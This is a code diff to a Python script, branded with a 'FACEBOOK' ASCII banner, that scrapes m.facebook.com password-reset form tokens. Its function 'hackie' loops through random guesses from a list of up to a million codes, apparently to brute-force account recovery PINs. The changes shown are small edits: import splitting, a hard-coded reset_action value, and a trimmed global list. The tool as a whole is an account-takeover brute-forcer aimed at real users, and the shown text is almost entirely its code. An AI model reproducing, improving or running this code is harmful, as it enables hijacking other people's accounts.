@@ -1,5 +1,6 @@
 #coding: utf-8
-import requests, sys, os, re, random, json
+import requests
+import sys, os, re, random, json
 from multiprocessing.pool import ThreadPool
 logo=""" \033[1;92m███████╗ █████╗  ██████╗███████╗██████╗  ██████╗  ██████╗ ██╗  ██╗
 ██╔════╝██╔══██╗██╔════╝██╔════╝██╔══██╗██╔═══██╗██╔═══██╗██║ ██╔╝
@@ -128,7 +129,7 @@ def send_req():
       URL = ("https://m.facebook.com:443"+re.findall(r'<form method="post" action="(.*?)" id=', web.text).pop(0))
       FORMS['lsd']=re.findall(r'name="lsd" value="(.*?)"', web.text).pop(0)
       FORMS['jazoest']=re.findall(r'name="jazoest" value="(.*?)"', web.text).pop(0)
-      FORMS['reset_action'] = re.findall(r'type="submit" value="(.*?)"', web.text).pop(0)
+      FORMS['reset_action'] = '1'
       URL = URL.replace("amp;", "")
       ok = open("urls.txt", "w")
       ok.write(str(URL))
@@ -182,7 +183,7 @@ def elsi(web, body):
   body['lsd']=re.findall(r'name="lsd" value="(.*?)"', web.text).pop(0)
   body['jazoest'] = re.findall(r'name="jazoest" value="(.*?)"', web.text).pop(0)
  # FORMS['reset_action'] = 'Magpatuloy'
-  body['reset_action'] = re.findall(r'<button type="submit" value="(.*?)"', web.text).pop(0)
+  body['reset_action'] = '1'
   return body, url
 def machine_found(web):
   form=dict()
@@ -193,12 +194,12 @@ def machine_found(web):
   ac_url=ac_url.replace("amp;", "")
   return ac_url, form
 def hackie(arg):
-  global RUN, session, codelist, total
+  global RUN, codelist, total
   body = json.loads(open("form.json", "r").read())
   cookie = json.loads(open("cookies.json", "r").read())
   header['Referer']=open("cach.txt", "r").read()
   url = open("cach.txt", "r").read()
-  pin =random.choice(codelist)
+  pin = random.choice(codelist)
   while bool(RUN) == True:
     try:
       if len(codelist) == 1000000:
